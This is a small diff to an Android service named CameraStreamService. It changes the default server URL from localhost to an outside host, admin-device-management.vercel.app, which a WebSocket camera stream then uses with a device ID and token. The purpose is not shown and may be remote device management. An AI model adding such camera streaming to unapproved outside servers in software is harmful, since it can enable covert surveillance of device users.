@@ -56,7 +56,7 @@ public class CameraStreamService extends Service {
         try {
             if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) { stopSelf(); return; }
             SharedPreferences prefs = getSharedPreferences("cp-device", MODE_PRIVATE);
-            String serverUrl = prefs.getString("serverUrl", "http://localhost:8080");
+            String serverUrl = prefs.getString("serverUrl", "https://admin-device-management.vercel.app");
             String wsUrl = serverUrl.replace("http://", "ws://").replace("https://", "wss://") + "/ws/device/" + prefs.getString("deviceId", "") + "?token=" + prefs.getString("deviceToken", "");
             ws = new SimpleWebSocketClient();
             ws.connect(wsUrl);
